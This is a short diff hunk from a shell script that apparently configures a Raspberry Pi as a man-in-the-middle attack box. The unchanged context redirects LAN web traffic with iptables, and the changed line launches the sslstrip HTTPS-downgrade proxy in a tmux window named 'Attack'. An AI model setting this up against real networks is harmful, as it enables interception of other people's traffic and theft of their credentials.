@@ -170,7 +170,7 @@ iptables -t nat -A PREROUTING -i $lan -p tcp --dport 80 -j DNAT --to-destination
 #PROXY
 cd bin/sslstrip/
 killall sslstrip
-tmux new-window -tAttack:8 -n 'Proxy' 'sslstrip -l 8080 -a'
+tmux new-window -tAttack:8 -n 'Proxy' './sslstrip.py -l 8080 -a'
 cd ../../
 
 ###########CANT ENABLE RELIABLY WITHOUT A 512MB PI################################
